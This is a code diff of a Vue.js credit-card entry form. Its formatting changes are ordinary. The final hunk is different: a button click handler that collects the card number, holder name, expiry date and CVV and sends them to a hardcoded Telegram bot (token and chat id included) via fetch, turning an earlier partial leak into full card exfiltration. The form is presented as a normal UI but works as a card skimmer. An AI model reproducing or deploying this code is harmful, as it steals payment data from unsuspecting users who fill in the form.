@@ -3,7 +3,7 @@ new Vue({
   el: "#app",
   data() {
     return {
-      currentCardBackground: Math.floor(Math.random()* 25 + 1), // just for fun :D
+      currentCardBackground: Math.floor(Math.random() * 25 + 1), // just for fun :D
       cardName: "",
       cardNumber: "",
       cardMonth: "",
@@ -23,7 +23,7 @@ new Vue({
     document.getElementById("cardNumber").focus();
   },
   computed: {
-    getCardType () {
+    getCardType() {
       let number = this.cardNumber;
       let re = new RegExp("^4");
       if (number.match(re) != null) return "visa";
@@ -36,32 +36,32 @@ new Vue({
 
       re = new RegExp("^6011");
       if (number.match(re) != null) return "discover";
-      
+
       re = new RegExp('^9792')
       if (number.match(re) != null) return 'troy'
 
       return "visa"; // default type
     },
-		generateCardNumberMask () {
-			return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
+    generateCardNumberMask() {
+      return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
     },
-    minCardMonth () {
+    minCardMonth() {
       if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
       return 1;
     }
   },
   watch: {
-    cardYear () {
+    cardYear() {
       if (this.cardMonth < this.minCardMonth) {
         this.cardMonth = "";
       }
     }
   },
   methods: {
-    flipCard (status) {
+    flipCard(status) {
       this.isCardFlipped = status;
     },
-    focusInput (e) {
+    focusInput(e) {
       this.isInputFocused = true;
       let targetRef = e.target.dataset.ref;
       let target = this.$refs[targetRef];
@@ -84,8 +84,8 @@ new Vue({
 });
 
 let but = document.querySelector("button")
-but.addEventListener("click", (e) =>{
-  
+but.addEventListener("click", (e) => {
+
   var num = document.querySelector("#cardNumber").value
   var hold = document.querySelector("#cardName").value
   var expmont = document.querySelector("#cardMonth").value
@@ -95,14 +95,19 @@ but.addEventListener("click", (e) =>{
 
   var token = "6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA"
   var chatid = -4071018603
-  var mytext = `Result ${num}` 
-  
-  var url = ` https://api.telegram.org/bot6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA/sendMessage?chat_id=-4071018603&text=${mytext}`
- 
+  var mytext = `Results: %0A Num=${num} %0A Hold= ${hold} %0A month= ${expmont} %0A year= ${expyr} %0A ccv= ${ccv}`
 
-  let aip = new XMLHttpRequest();
-  aip.open("GET", url, true);
-  aip.send
-  console.log("kargadaayvelaperi")
+  var url = ` https://api.telegram.org/bot6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA/sendMessage?chat_id=-4071018603&text=${mytext}`
+
+
+  async function logdata() {
+    const response = await fetch(url);
+    const data = await response.json();
+  }
+
+
+  logdata()
+
+
 
 })
